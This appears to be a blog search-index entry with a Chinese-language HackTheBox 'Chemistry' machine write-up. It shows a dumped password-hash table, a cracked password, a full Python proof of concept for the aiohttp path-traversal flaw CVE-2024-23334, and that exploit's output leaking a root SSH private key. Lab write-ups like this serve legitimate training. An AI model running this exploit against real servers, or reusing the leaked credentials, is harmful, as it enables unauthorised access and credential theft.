@@ -1,0 +1,48 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>Chemistry</title>
+    <url>/2025/02/02/Chemistry/</url>
+    <content><![CDATA[一.信息收集扫描扫到22和5000端口
+5000端口为一个web服务器
+
+注册一个账号登陆
+
+二.shell上传能弹shell的cil文件
+
+成功弹到shell
+查看用户
+cat /etc/passwdcat /etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:103:106::/nonexistent:/usr/sbin/nologinsyslog:x:104:110::/home/syslog:/usr/sbin/nologin_apt:x:105:65534::/nonexistent:/usr/sbin/nologintss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/falseuuidd:x:107:112::/run/uuidd:/usr/sbin/nologintcpdump:x:108:113::/nonexistent:/usr/sbin/nologinlandscape:x:109:115::/var/lib/landscape:/usr/sbin/nologinpollinate:x:110:1::/var/cache/pollinate:/bin/falsefwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologinusbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologinsshd:x:113:65534::/run/sshd:/usr/sbin/nologinsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologinrosa:x:1000:1000:rosa:/home/rosa:/bin/bashlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/falseapp:x:1001:1001:,,,:/home/app:/bin/bash_laurel:x:997:997::/var/log/laurel:/bin/false
+
+在instance目录下找到数据库文件
+查看数据库文件
+sqlite3 database.db.tablesstructure  user SELECT * FROM user;1|admin|2861debaf8d99436a10ed6f75a252abf2|app|197865e46b878d9e74a0346b6d59886a3|rosa|63ed86ee9f624c7b14f1d4f43dc251a54|robert|02fcf7cfc10adc37959fb21f06c6b4675|jobert|3dec299e06f7ed187bac06bd3b670ab26|carlos|9ad48828b0955513f7cf0f7f6510c8f87|peter|6845c17d298d95aa942127bdad2ceb9b8|victoria|c3601ad2286a4293868ec2a4bc606ba39|tania|a4aa55e816205dc0389591c9f82f43bb10|eusebio|6cad48078d0241cca9a7b322ecd073b311|gelacia|4af70c80b68267012ecdac9a7e916d1812|fabian|4e5d71f53fdd2eabdbabb233113b5dc013|axel|9347f9724ca083b17e39555c36fd900714|kristel|6896ba7b11a62cacffbdaded457c6d9215|1|c4ca4238a0b923820dcc509a6f75849b在上述passwd看到app,rosa,和admin尝试破解rosa的密码
+
+
+md5破解,得到密码unicorniosrosados
+
+ssh连上.拿到user.txt
+三.权限提升rosa@chemistry:~$ ss -tulnNetid  State   Recv-Q  Send-Q   Local Address:Port   Peer Address:Port Process  udp    UNCONN  0       0        127.0.0.53%lo:53          0.0.0.0:*             udp    UNCONN  0       0              0.0.0.0:68          0.0.0.0:*             tcp    LISTEN  0       128            0.0.0.0:5000        0.0.0.0:*             tcp    LISTEN  0       128          127.0.0.1:8080        0.0.0.0:*             tcp    LISTEN  0       4096     127.0.0.53%lo:53          0.0.0.0:*             tcp    LISTEN  0       128            0.0.0.0:22          0.0.0.0:*             tcp    LISTEN  0       128               [::]:22             [::]:* 
+
+查看网络连接，内部8080可能部署着web服务端
+curl -I http://localhost:8080HTTP/1.1 200 OKContent-Type: text/html; charset=utf-8Content-Length: 5971Date: Sun, 28 Sep 2025 03:00:40 GMTServer: Python/3.9 aiohttp/3.9.1
+
+可以得知服务为aiohttp
+ssh -N rosa@10.129.99.73 -L 8888:localhost:8080
+
+
+一个站点监控,找aiohttp的漏洞
+CVE-2024-23334的目录遍历漏洞
+找到poc
+import argparseimport http.clientimport textwrapimport urllib  def exploit(url, file, dir):    parsed_url = urllib.parse.urlparse(url)    conn = http.client.HTTPConnection(parsed_url.netloc)     traversal  = &quot;/..&quot;    payload = dir    for i in range(15):        payload += traversal         print(f&#x27;&#x27;&#x27;[+] Attempt &#123;i&#125;                    Payload: &#123;payload&#125;&#123;file&#125;        &#x27;&#x27;&#x27;)         conn.request(&quot;GET&quot;, f&quot;&#123;parsed_url.path&#125;&#123;payload&#125;&#123;file&#125;&quot;)        res = conn.getresponse()        result = res.read()        print(f&quot;                    Status code: &#123;res.status&#125;&quot;)         if res.status == 200:            print(&quot;Respose: &quot;)            print(result.decode())            break   if __name__ == &quot;__main__&quot;:    parser = argparse.ArgumentParser(        description=&quot;PoC for CVE-2024-23334. LFI/Path-Traversal Vulnerability in Aiohttp&quot;,        formatter_class=argparse.RawDescriptionHelpFormatter,        epilog=textwrap.dedent(&#x27;&#x27;&#x27; Usage:            exploit.py -u http://127.0.0.1 -f /etc/passwd -d /static        &#x27;&#x27;&#x27;)    )     parser.add_argument(&#x27;-u&#x27;, &#x27;--url&#x27;, help=&quot;Aiohttp site url&quot;)    parser.add_argument(&#x27;-f&#x27;, &#x27;--file&#x27;, help=&quot;File to read&quot;)    parser.add_argument(&#x27;-d&#x27;, &#x27;--directory&#x27;, help=&quot;Directory with static files. Default: /static&quot;, default=&quot;/static&quot;)     args = parser.parse_args()    if args.url and args.file and args.directory:        exploit(args.url, args.file, args.directory)        print(&quot;Exploit complete&quot;)    else:        print(&quot;Error: One of the parameters is missing&quot;)
+
+       python &#x27;/home/xingguangqwq/Desktop/1.py&#x27; -u http://localhost:8888 -f /root/.ssh/id_rsa -d /assets[+] Attempt 0                    Payload: /assets/../root/.ssh/id_rsa                            Status code: 404[+] Attempt 1                    Payload: /assets/../../root/.ssh/id_rsa                            Status code: 404[+] Attempt 2                    Payload: /assets/../../../root/.ssh/id_rsa                            Status code: 200Respose: -----BEGIN OPENSSH PRIVATE KEY-----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-----END OPENSSH PRIVATE KEY-----Exploit complete
+
+用ssh连接，成功拿到root
+
+]]></content>
+      <tags>
+        <tag>hackthebox</tag>
+      </tags>
+  </entry>
+</search>
